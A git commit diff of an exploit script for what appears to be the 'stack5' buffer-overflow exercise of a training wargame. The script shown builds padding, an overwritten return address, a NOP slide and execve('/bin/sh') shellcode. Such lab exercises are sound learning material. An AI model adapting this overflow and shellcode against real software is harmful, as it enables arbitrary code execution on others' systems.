dfce12242a28b56463b8f19391eda9ad1bcad23c
TheCatLover <johnthejolly@gmail.com>
2017-10-29 23:31:31 -0500

    Update script.py

--- stack5/script.py
+++ stack5/script.py
@@ -1,7 +1,7 @@
 import struct
 
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
-eip = struct.pack("I", 0xbffff7c0+45)
+padding = "A"*76
+eip = struct.pack("I", 0xbffff7c0+32)
 nopslide = "\x90"*100
 payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # shellcode found here: http://shell-storm.org/shellcode/files/shellcode-811.php
 
